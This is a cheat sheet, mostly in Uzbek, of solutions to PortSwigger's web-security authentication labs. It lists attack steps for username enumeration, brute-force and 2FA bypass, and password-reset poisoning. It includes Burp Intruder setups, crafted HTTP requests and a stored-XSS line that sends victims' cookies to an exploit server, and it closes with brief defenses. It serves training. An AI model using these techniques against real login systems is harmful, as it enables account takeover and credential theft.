# Authentication — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**.
> Test user: `wiener:peter`. Nishon: `carlos` / `administrator`.
> Wordlistlar (reference): `/web-security/authentication/auth-lab-usernames` va `auth-lab-passwords`.

---

## Username enumeration (userni topish)

### Different responses — APPRENTICE
Noto'g'ri user → "Invalid username", mavjud user → "Incorrect password" (uzunlik farqi).
```
Intruder Sniper → username pozitsiya → usernames wordlist → Length bo'yicha sort → farqli javob
Keyin: topilgan user + passwords wordlist → Status 302 = to'g'ri parol
```

### Subtly different responses — PRACTITIONER
Xato matni deyarli bir xil — faqat nuqtadan keyin **probel** farqi.
```
Grep-Extract: "Invalid username or password." → sort → outlier (trailing space) = valid user
```

### Response timing — PRACTITIONER
Mavjud user + uzun parol → javob sekinroq. IP block'ni `X-Forwarded-For` bilan aylanasan.
```
X-Forwarded-For: <har safar boshqa raqam>
password = ~100 belgi
Intruder Pitchfork: pos1=XFF(1..100), pos2=usernames → sekin javob = valid user
```

### Account lock — PRACTITIONER
Mavjud userga 5 marta urilganda "too many incorrect login attempts" chiqadi → shu user bor.
```
Intruder Cluster bomb: username wordlist × Null payloads(5) → lock xabari = valid user
Keyin Sniper password brute → grep xabarsiz javob = to'g'ri parol (lock reset ~1 daq)
```

---

## Brute-force protection buzilgan

### IP block broken — PRACTITIONER
3 xato → IP block, LEKIN o'z akkauntingga kirsang counter nolga tushadi.
```
Pitchfork, max concurrent = 1
pos1 username: wiener, carlos, carlos, carlos... (wiener'ni oraga tashlab counter reset)
pos2 password: peter, <candidate>, <candidate>... (peter wiener bilan tekislanadi)
→ carlos uchun yagona 302 = parol
```

### Multiple credentials per request (JSON array) — PRACTITIONER
Parolni massiv qilib bitta so'rovda hammasini yuborasan — rate-limit bitta so'rovni ko'radi.
```json
{"username":"carlos","password":["123456","password","qwerty", ...]}
```
> 302 qaytadi → "Show response in browser" → carlos sifatida kirgan bo'lasan.

---

## 2FA / MFA bypass

### 2FA simple bypass (forced browsing) — APPRENTICE
2FA qadamidan o'tmay to'g'ridan `/my-account` ga kirasan.
```
carlos:montoya bilan login → 2FA so'ralganda URL'ni qo'lda /my-account qil
```

### 2FA broken logic — PRACTITIONER
`verify` parametri qaysi akkaunt ekanini belgilaydi — carlos uchun kod generatsiya qilib brute.
```
GET /login2 → verify=carlos (carlos uchun kod yaratadi)
POST /login2 → verify=carlos, Intruder mfa-code brute (0000-9999) → 302
```

### 2FA bypass via brute-force (macro) — PRACTITIONER
Har urinishdan oldin qayta login kerak → Session Handling macro (`GET /login`, `POST /login`,
`GET /login2`) → keyin mfa-code brute.
```
Settings → Sessions → Session Handling Rule → Run a macro (3 so'rov)
Intruder: mfa-code pozitsiya, Numbers 0–9999 (4 digit), max concurrent=1 → 302
```

---

## Boshqa mexanizmlar

### Brute-forcing stay-logged-in cookie — PRACTITIONER
Cookie format: `base64(username + ':' + md5(password))`.
```
Intruder: stay-logged-in cookie = pozitsiya
Payload processing (tartib bilan): Hash MD5 → Add prefix "carlos:" → Base64-encode
Grep match: "Update email" → topilgan javob = carlos cookie
```

### Offline password cracking — PRACTITIONER
Stored XSS bilan `stay-logged-in` cookie'ni o'g'irlab, MD5 hash'ni ochasan.
```html
<script>document.cookie</script> ni exploit serverga jo'nat (XSS)
→ access log'dan carlos cookie → base64 decode → carlos:<md5> → hashcat/lookup → parol
```

### Password brute-force via password change — PRACTITIONER
Change-password oracle: to'g'ri joriy parol + farqli yangi parollar → "New passwords do not match"
(ya'ni joriy parol to'g'ri edi).
```
POST /my-account/change-password
username=carlos, current-password=§brute§, new1≠new2
Grep match: "New passwords do not match" → o'sha payload = carlos paroli
```

### Password reset broken logic — APPRENTICE
Reset token umuman tekshirilmaydi → token'ni bo'sh qoldirib, `username=carlos` qil.
```
POST /forgot-password?temp-forgot-password-token=
body: temp-forgot-password-token=&username=carlos&new-password-1=...&new-password-2=...
```

### Password reset poisoning via middleware — PRACTITIONER
`X-Forwarded-Host` reset linkini sening domeningga yo'naltiradi → carlos token'ini o'g'irlaysan.
```
POST /forgot-password
X-Forwarded-Host: exploit.example.net
username=carlos
→ exploit access log'da carlos reset token → haqiqiy link'ga qo'yib parol o'zgartir
```

---

### Eslatma
Himoya: rate-limit (IP emas, akkaunt bo'yicha), bir xil javob/vaqt, 2FA'ni server-side majburlash,
reset token = random + bog'langan + bir martalik. Umumiy: bu papka README.
